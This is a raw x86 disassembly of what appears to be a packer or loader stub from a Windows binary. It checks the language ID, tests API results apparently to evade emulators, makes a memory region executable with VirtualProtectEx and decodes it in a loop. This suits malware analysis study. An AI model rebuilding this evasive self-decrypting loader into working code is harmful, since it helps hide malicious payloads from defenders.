0x00401000:	pushl	%ebp	; from: 0x0040115d(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	pushl	%ecx
0x00401004:	pushl	%ebx
0x00401005:	pushl	%esi
0x00401006:	movl	0x0043e1c0, %esi
0x0040100c:	pushl	%edi
0x0040100d:	movl	0x8(%ebp), %edi
0x00401010:	movl	$0x7d456a00, %edx
0x00401015:	movl	$0x150d1d71, -4(%ebp)
0x0040101c:	leal	(%esi,%ecx), %eax
0x0040101f:	subl	%ecx, %edi
0x00401021:	testb	$0x1, %dl	; from: 0x0040105a(MAY)
0x00401024:	je	0x0040103e	; targets: 0x0040103e(MAY), 0x00401026(MAY)
0x00401026:	movl	%esi, %ecx	; from: 0x00401024(MAY)
0x00401028:	shrl	$0x5, %ecx
0x0040102b:	movl	%esi, %ebx
0x0040102d:	shll	$0x5, %ebx
0x00401030:	orl	%ebx, %ecx
0x00401032:	addl	%ecx, -4(%ebp)
0x00401035:	movb	(%edi,%eax), %cl
0x00401038:	subb	%dl, %cl
0x0040103a:	movb	%cl, (%eax)
0x0040103c:	jmp	0x0040104f	; targets: 0x0040104f(MAY)
0x0040103e:	movb	(%edi,%eax), %bl	; from: 0x00401024(MAY)
0x00401041:	addl	$0x38, -4(%ebp)
0x00401045:	movzbl	%dl, %ecx
0x00401048:	andl	$0x7, %ecx
0x0040104b:	rorb	%cl, %bl
0x0040104d:	movb	%bl, (%eax)
0x0040104f:	incl	%esi	; from: 0x0040103c(MAY)
0x00401050:	roll	$0x9, %edx
0x00401053:	incl	%eax
0x00401054:	cmpl	$0xd14, %esi
0x0040105a:	jl	0x00401021	; targets: 0x0040105c(MAY), 0x00401021(MAY)
0x0040105c:	movl	-4(%ebp), %eax	; from: 0x0040105a(MAY)
0x0040105f:	xorl	%eax, 0x0043e1c0
0x00401065:	popl	%edi
0x00401066:	xorl	%eax, %eax
0x00401068:	popl	%esi
0x00401069:	incl	%eax
0x0040106a:	popl	%ebx
0x0040106b:	leave	
0x0040106c:	ret	; targets: unresolved


start:
0x0040106d:	pushl	%ebp
0x0040106e:	movl	%esp, %ebp
0x00401070:	subl	$0x48, %esp
0x00401073:	pushl	%esi
0x00401074:	call	GetSystemDefaultLangID@kernel32.dll	; targets: 0xff000e40(MAY)
0x0040107a:	movzwl	%ax, %eax
0x0040107d:	movl	%eax, -32(%ebp)
0x00401080:	leal	-32(%ebp), %eax
0x00401083:	pushl	%eax
0x00401084:	call	SHGetThreadRef@shlwapi.dll	; targets: 0xff001860(MAY)
0x0040108a:	cmpl	$0x80004002, %eax
0x0040108f:	jne	0x00401097	; targets: 0x00401091(MAY), 0x00401097(MAY)
0x00401091:	cmpl	$0x0, -32(%ebp)	; from: 0x0040108f(MAY)
0x00401095:	je	0x0040109e	; targets: 0x0040109e(MAY), 0x00401097(MAY)
0x00401097:	xorl	%eax, %eax	; from: 0x00401095(MAY), 0x0040108f(MAY)
0x00401099:	jmp	0x004011bf	; targets: 0x004011bf(MAY)
0x0040109e:	movl	$0xb, -12(%ebp)	; from: 0x00401095(MAY)
0x004010a5:	jmp	0x004010ae	; targets: 0x004010ae(MAY)
0x004010a7:	movl	-12(%ebp), %eax	; from: 0x004010dd(MAY)
0x004010aa:	incl	%eax
0x004010ab:	movl	%eax, -12(%ebp)
0x004010ae:	pushl	$0x1	; from: 0x004010a5(MAY)
0x004010b0:	pushl	$0x80000050
0x004010b5:	call	SHDeleteEmptyKeyA@shlwapi.dll	; targets: 0xff0019b0(MAY)
0x004010bb:	cmpl	$0x6, %eax
0x004010be:	je	0x004010df	; targets: 0x004010df(MAY), 0x004010c0(MAY)
0x004010c0:	movl	-12(%ebp), %eax	; from: 0x004010be(MAY)
0x004010c3:	andl	$0x8000007f, %eax
0x004010c8:	jns	0x004010cf	; targets: 0x004010cf(MAY)
0x004010cf:	movl	-12(%ebp), %ecx	; from: 0x004010c8(MAY)
0x004010d2:	movb	%al, -28(%ebp,%ecx)
0x004010d6:	movl	-12(%ebp), %eax
0x004010d9:	decl	%eax
0x004010da:	movl	%eax, -12(%ebp)
0x004010dd:	jmp	0x004010a7	; targets: 0x004010a7(MAY)
0x004010df:	movl	$0x493000, %eax	; from: 0x004010be(MAY)
0x004010e4:	andl	$0xfffff000, %eax
0x004010e9:	movl	%eax, -48(%ebp)
0x004010ec:	movl	$0x493000, %eax
0x004010f1:	subl	-48(%ebp), %eax
0x004010f4:	addl	$0xd14, %eax
0x004010f9:	movl	%eax, -36(%ebp)
0x004010fc:	movl	-36(%ebp), %eax
0x004010ff:	shll	%eax
0x00401101:	movl	-36(%ebp), %ecx
0x00401104:	shrl	$0x1f, %ecx
0x00401107:	orl	%ecx, %eax
0x00401109:	movl	%eax, -52(%ebp)
0x0040110c:	movl	-48(%ebp), %eax
0x0040110f:	subl	-52(%ebp), %eax
0x00401112:	movl	%eax, -56(%ebp)
0x00401115:	movl	-56(%ebp), %eax
0x00401118:	orl	$0x48a9, %eax
0x0040111d:	movl	%eax, -60(%ebp)
0x00401120:	movl	-60(%ebp), %eax
0x00401123:	movl	%eax, -40(%ebp)
0x00401126:	movl	-36(%ebp), %eax
0x00401129:	addl	$0xfff, %eax
0x0040112e:	andl	$0xfffff000, %eax
0x00401133:	movl	%eax, -36(%ebp)
0x00401136:	leal	-44(%ebp), %eax
0x00401139:	pushl	%eax
0x0040113a:	pushl	$0x40
0x0040113c:	pushl	-36(%ebp)
0x0040113f:	pushl	-48(%ebp)
0x00401142:	pushl	$0xffffffff
0x00401144:	call	VirtualProtectEx@kernel32.dll	; targets: 0xff0000d0(MAY)
0x0040114a:	movl	-36(%ebp), %eax
0x0040114d:	subl	-44(%ebp), %eax
0x00401150:	movl	%eax, -36(%ebp)
0x00401153:	pushl	$0x493000
0x00401158:	movl	$0x493000, %ecx
0x0040115d:	call	0x00401000	; targets: 0x00401000(MAY)
0x004011bf:	popl	%esi	; from: 0x00401099(MAY)
0x004011c0:	leave	
0x004011c1:	ret	$0x10	; targets: 0xfee70000(MAY)

